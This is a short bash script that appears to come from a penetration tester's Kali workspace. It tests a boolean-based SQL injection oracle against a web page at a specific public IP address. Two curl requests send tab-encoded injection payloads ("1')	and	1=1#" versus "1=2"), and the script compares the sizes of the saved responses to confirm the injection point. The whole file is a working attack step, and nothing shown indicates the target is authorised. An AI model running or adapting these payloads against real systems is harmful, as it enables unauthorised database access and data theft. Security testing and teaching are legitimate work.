#!/bin/bash
# Test boolean-based injection oracle
# True: should show article data
curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%091=1%23" > /home/kali/桌面/hack/8.140.206.93/recon/bool-true.html
# False: should show empty card
curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%091=2%23" > /home/kali/桌面/hack/8.140.206.93/recon/bool-false.html
echo "True: $(wc -c < /home/kali/桌面/hack/8.140.206.93/recon/bool-true.html) bytes"
echo "False: $(wc -c < /home/kali/桌面/hack/8.140.206.93/recon/bool-false.html) bytes"
